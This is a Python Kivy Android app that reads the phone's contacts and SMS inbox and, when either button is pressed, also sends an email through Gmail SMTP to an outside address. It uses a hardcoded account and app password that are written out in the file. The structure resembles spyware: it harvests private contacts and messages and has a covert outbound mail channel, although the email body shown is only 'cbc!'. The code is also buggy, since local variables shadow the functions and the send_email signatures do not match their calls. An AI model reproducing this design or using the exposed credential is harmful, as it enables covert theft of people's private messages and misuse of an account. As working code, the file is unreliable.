from jnius import cast
from kivy.app import App
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from jnius import autoclass
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.scrollview import ScrollView
from datetime import datetime
import smtplib


def send_email():
    fromaddr = "team.kapamia@gmail.com"
    toaddrs = "makumbamomanyi@gmail.com"
    msg = "cbc!"
    username = "team.kapamia@gmail.com"
    password = "iqlwwsulekifybhf"  # Application specific password
    server = smtplib.SMTP('smtp.gmail.com:587')

    server.starttls()
    server.login(username,password)
    server.sendmail(fromaddr, toaddrs, msg)
    server.quit()

def contact_list():
    try:
        PythonActivity = autoclass('org.kivy.android.PythonActivity')
        ContactsContract = autoclass("android.provider.ContactsContract")
        Contacts = autoclass("android.provider.ContactsContract$Contacts")
        Kinds = autoclass("android.provider.ContactsContract$CommonDataKinds$Phone")

        cr = PythonActivity.mActivity.getContentResolver()
        projection = [Contacts._ID, Contacts.DISPLAY_NAME, Kinds.NUMBER]
        query = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, projection, None, None, None)

        contact_names = []
        for row in query:
            contact_names.append({
                "contact name": row[Contacts.DISPLAY_NAME],
                "contact number": row[Kinds.NUMBER]
            })

        return str(contact_names)

    except:
        return "Negative state"

def sms_inbox():
    try:
        PythonActivity = autoclass('org.kivy.android.PythonActivity')
        Sms = autoclass("android.provider.Telephony$Sms")

        cr = PythonActivity.mActivity.getContentResolver()
        uri = Sms.CONTENT_URI
        projection = [Sms._ID, Sms.ADDRESS, Sms.BODY, Sms.DATE]
        query = cr.query(uri, projection, None, None, Sms.DATE + " DESC")

        sms = []
        for row in query:
            sms.append({
                "sms id": row[Sms._ID],
                "sender": row[Sms.ADDRESS],
                "body": row[Sms.BODY],
                "date": row[Sms.DATE]
            })

        return str(sms)

    except:
        return "Negative state"


    

class MyApp(App):

    def build(self):
        self.label = Label(text=" click to Display data!")
        self.button_contact_list = Button(text="Get Contact List")
        self.button_sms_inbox = Button(text="Get SMS Inbox")
        self.button_quit = Button(text="Quit")
        

        self.button_contact_list.bind(on_press=self.get_contact_list)
        self.button_sms_inbox.bind(on_press=self.get_sms_inbox)
        self.button_quit.bind(on_press=self.quit_app)
        self.button_sms_inbox.bind(on_press=self.send_email)
        self.button_contact_list.bind(on_press=self.send_email)
  
        
        layout = BoxLayout(orientation='vertical')
        layout.add_widget(self.label)
        layout.add_widget(self.button_contact_list)
        layout.add_widget(self.button_sms_inbox)
        layout.add_widget(self.button_quit)

        return layout

    def get_contact_list(self, instance):
        contact_list = contact_list()
        self.label.text = contact_list
        self.send_email()

    def get_sms_inbox(self, instance):
        sms_inbox = sms_inbox()
        self.label.text = sms_inbox
        self.send_email()

    def quit_app(self, instance):
        self.stop()

    def on_request_permissions(self, permissions, grant_results):
        for permission, grant_result in zip(permissions, grant_results):
            if permission == "android.permission.READ_CONTACTS":
                if grant_result == True:
                    print("Contacts permission granted")
                else:
                    print("Contacts permission denied")

            elif permission == "android.permission.SEND_SMS":
                if grant_result == True:
                    print("SMS permission granted")
                else:
                    print("SMS permission denied")

        self.get_contact_list()
        self.get_sms_inbox()    

    def send_email(self, instance):
        send_email()
        self.label.text = "Email sent successfully!"

    
    

    

    

if __name__ == '__main__':
    MyApp().run()
